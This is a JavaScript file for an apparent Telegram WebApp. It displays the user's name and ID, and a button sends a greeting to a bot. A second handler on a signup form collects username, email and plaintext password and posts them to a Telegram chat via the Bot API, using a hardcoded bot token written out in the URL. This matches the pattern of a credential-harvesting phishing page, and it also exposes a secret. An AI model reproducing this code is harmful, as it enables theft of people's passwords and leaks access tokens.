document.addEventListener("DOMContentLoaded", () => {
  const tg = window.Telegram.WebApp; // Получаем объект WebApp
  tg.expand(); // Разворачиваем WebApp на весь экран

  // Получаем информацию о пользователе
  const user = tg.initDataUnsafe?.user;

  // Если пользователь авторизован, то выводим его имя и ID
  if (user) {
    document.getElementById("username").textContent = user.first_name;
    document.getElementById("userid").textContent = `ID: ${user.id}`;
  }

  // Кнопка "Отправить данные"
  document.getElementById("sendData").addEventListener("click", () => {
    const data = {
      message: `Привет от WebApp!`,
      user_id: user ? user.id : "неизвестно",
    };

    const botAnswer = document.getElementById("botAnswer");
    botAnswer.textContent = "Отправляем данные боту..."; // Выводим сообщение о отправке данных

  
    tg.sendData(JSON.stringify(data)); // Отправляем данные боту
    tg.close(); // Закрываем WebApp после отправки
  });

  // Кнопка "Закрыть"
  document.getElementById("closeApp").addEventListener("click", () => {
    tg.close(); // Закрываем WebApp
  });
});


document
  .getElementById("signupFormContent")
  .addEventListener("submit", function (event) {
    event.preventDefault();
    var username = document.getElementById("username").value;
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var message = `Username: ${username}\nEmail: ${email}\nPassword: ${password}`;

    var telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
    var telegramChatId = "YOUR_TELEGRAM_CHAT_ID";

    var url = `https://api.telegram.org/bot7439911780:AAF-0YhIPfyfKJ54tfSpQXOvQozi0taeTCU/sendMessage`;

    var data = {
      chat_id: telegramChatId,
      text: message,
    };

    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          alert("Message sent successfully!");
        } else {
          alert("Error sending message.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Error sending message.");
      });
  });
